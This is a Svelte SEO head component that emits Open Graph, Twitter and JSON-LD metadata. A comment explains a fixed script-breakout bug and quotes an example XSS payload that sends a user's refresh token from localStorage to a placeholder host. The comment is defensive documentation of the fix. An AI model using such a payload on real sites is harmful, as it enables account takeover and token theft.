<script lang="ts">
	/**
	 * Unified SEO head component.
	 *
	 * Renders the complete, WhatsApp/Facebook/X/LinkedIn-compatible metadata set
	 * from a single SeoMeta object. Every public page uses this so the emitted
	 * <head> is always consistent and complete — no more per-page drift.
	 *
	 * All tags render inside <svelte:head>, so with SSR enabled they are present
	 * in the initial HTML that crawlers (which do not run JavaScript) receive.
	 */
	import { page } from '$app/stores';
	import { OG_IMAGE, SITE, fallbackSeo, type SeoMeta } from '$lib/seo';
	// C-09 — JSON-LD must not be able to terminate its own script element.
	import { safeJsonLd } from '$lib/seo/utils';

	export let seo: SeoMeta | null | undefined = null;

	// Final safety net. Server loads already degrade to fallbackSeo rather than
	// null, but a page rendering *no* Open Graph tags is the one outcome we can
	// never afford: WhatsApp caches an empty result for days, so a single bad
	// render poisons a link long after the underlying problem is fixed. If we
	// somehow get here without metadata, emit a generic card for the current
	// URL instead of nothing.
	$: meta = seo ?? fallbackSeo($page.url.pathname);

	$: alt = meta.imageAlt || meta.title || SITE.name;
	$: ogType = meta.ogType || 'website';
	// Share images are rendered at a fixed size by the Image CDN, so these are
	// accurate for every page unless a builder deliberately overrides them.
	$: imageWidth = meta.imageWidth ?? OG_IMAGE.width;
	$: imageHeight = meta.imageHeight ?? OG_IMAGE.height;
</script>

<svelte:head>
	<title>{meta.title}</title>
	<meta name="description" content={meta.description} />
	<link rel="canonical" href={meta.url} />
	{#if meta.noindex}
		<meta name="robots" content="noindex, nofollow" />
	{:else}
		<meta name="robots" content="index, follow" />
	{/if}

	<!-- Open Graph (Facebook, WhatsApp, Telegram, LinkedIn, iMessage) -->
	<meta property="og:site_name" content={SITE.name} />
	<meta property="og:type" content={ogType} />
	<meta property="og:title" content={meta.title} />
	<meta property="og:description" content={meta.description} />
	<meta property="og:url" content={meta.url} />
	<meta property="og:locale" content={SITE.locale} />
	<!--
		og:image:width and og:image:height are what make WhatsApp render a large
		preview card. Without them WhatsApp has to download and measure the image
		before it can lay the card out, and it gives up if that does not finish
		quickly — which is why previews appeared intermittently.
	-->
	<meta property="og:image" content={meta.image} />
	<meta property="og:image:secure_url" content={meta.image} />
	<meta property="og:image:width" content={String(imageWidth)} />
	<meta property="og:image:height" content={String(imageHeight)} />
	<meta property="og:image:type" content={meta.imageType || OG_IMAGE.mime} />
	<meta property="og:image:alt" content={alt} />

	<!-- Twitter / X -->
	<meta name="twitter:card" content="summary_large_image" />
	<meta name="twitter:site" content={SITE.twitter} />
	<meta name="twitter:title" content={meta.title} />
	<meta name="twitter:description" content={meta.description} />
	<meta name="twitter:image" content={meta.image} />
	<meta name="twitter:image:alt" content={alt} />

	<!-- Event facets for crawlers that read them -->
	{#if meta.event?.startDate}
		<meta name="event:start_date" content={meta.event.startDate} />
	{/if}
	{#if meta.event?.endDate}
		<meta name="event:end_date" content={meta.event.endDate} />
	{/if}
	{#if meta.event?.location}
		<meta name="event:location" content={meta.event.location} />
	{/if}

	<!--
		JSON-LD structured data.

		C-09 route 1 — this was `JSON.stringify(meta.jsonLd)` interpolated
		straight into a `{@html}` script element. `JSON.stringify` escapes
		neither `<` nor `/`, so an event title of

		    </script><script>fetch('//evil/?t='+localStorage.auth_refresh_token)</script>

		broke out of the block. It renders SERVER-SIDE into `<head>` on every
		SEO page and no route sets `ssr = false`, so loading a public event page
		was enough. Because both tokens live in `localStorage` with a 30-day
		sliding refresh, that is persistent account takeover, not session
		hijack.

		`safeJsonLd` escapes `<`, `>`, `&` and the U+2028/U+2029 line
		separators to `\uXXXX`. The JSON stays semantically identical — a parser
		decodes the escapes — but the serialized text can no longer terminate
		the enclosing element. It is applied to the whole string rather than
		per-field on purpose: the previous per-field approach sanitized
		`description` and let nine other fields through.
	-->
	{#if meta.jsonLd}
		{@html `<script type="application/ld+json">${safeJsonLd(meta.jsonLd)}<\/script>`}
	{/if}
</svelte:head>
